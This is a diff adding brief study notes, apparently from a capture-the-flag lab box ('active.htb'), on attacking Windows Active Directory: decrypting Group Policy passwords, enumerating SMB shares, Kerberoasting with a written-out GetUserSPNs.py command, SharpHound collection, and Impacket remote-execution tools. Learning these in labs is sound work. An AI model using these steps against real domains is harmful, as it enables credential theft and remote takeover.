@@ -1,0 +1,33 @@
+Yes, it is the default way Group Policy stores passwords.  Just seeing the password in Groups.xml in the SYSVOL directory tells me what it is.
+## gpp-decrypt
+
+When you see SMB on a Windows box
+- run smb* scripts with NMAP to check for possible easy wins
+- smbclient is used to interact with shares
+- "smbclient -L" to list shares
+- "smbmap -H -R" to list recursively (with access info)
+- If connected, turn recurse ON and prompt OFF, then mget * to download all files locally
+
+Tools to request and export the TGS ticket hashes in a hashcat-compatible format:
+- Rubeus
+- Impacket's GetUserSPNs.py
+- PowerShell's Invoke-Kerberoast module.
+- GetUserSPNs.py -request -dc-ip 10.129.6.212 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out
+
+Hashcat cheat sheet:
+- https://www.blackhillsinfosec.com/hashcat-cheatsheet/
+
+** Bloodhound **
+- Sharphound.exe
+- Sharphound.ps1
+- Sharphound.exe -c all -d active.htb --domain-controller 10.129.6.212
+
+Hashcat example hashes
+- https://hashcat.net/wiki/doku.php?id=example_hashes
+
+
+
+*** Impacket ***
+GetUserSPN.py  -- extract ticket/hash from kerberoastables users
+psexec.py  -- CLI interaction to a domain with creds over SMB (445)
+wmiexec.py  -- remote command execution with creds over WMI (135)
